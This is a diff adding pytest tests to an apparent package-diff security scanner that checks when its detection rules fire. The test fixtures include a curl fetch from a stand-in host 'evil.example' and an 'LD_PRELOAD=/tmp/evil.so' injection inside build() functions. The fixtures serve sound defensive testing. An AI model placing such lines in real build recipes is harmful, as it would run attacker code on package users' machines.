@@ -683,3 +683,41 @@ def test_function_scope_ignores_non_shell_companion_files():
         raw_indices=raw_indices,
     )
     assert not [r for r in triggered if r["rule_id"] == "R010"]
+
+
+def test_line_context_ignores_non_shell_file_headers():
+    from trustsight.rules import _classify_line_context
+
+    lines = [
+        "+++ b/notes.json",
+        " build() {",
+        "+  curl -s https://evil.example/x",
+        " }",
+    ]
+    assert _classify_line_context(lines)[2] == "other"
+
+
+def test_code_rules_ignore_non_shell_companion_functions():
+    from trustsight.analysis import scan_diff
+
+    diff = (
+        "--- a/notes.json\n+++ b/notes.json\n@@ -1,3 +1,3 @@\n"
+        " build() {\n"
+        "+  export LD_PRELOAD=/tmp/evil.so\n"
+        " }\n"
+    )
+    fact = scan_diff(diff, rules=[], package_name="demo", seen_urls={})
+    assert not [e for e in fact.score_breakdown if e.rule_id == "H025"]
+
+
+def test_code_rules_still_fire_in_the_recipe():
+    from trustsight.analysis import scan_diff
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
+        " build() {\n"
+        "+  export LD_PRELOAD=/tmp/evil.so\n"
+        " }\n"
+    )
+    fact = scan_diff(diff, rules=[], package_name="demo", seen_urls={})
+    assert [e for e in fact.score_breakdown if e.rule_id == "H025"]
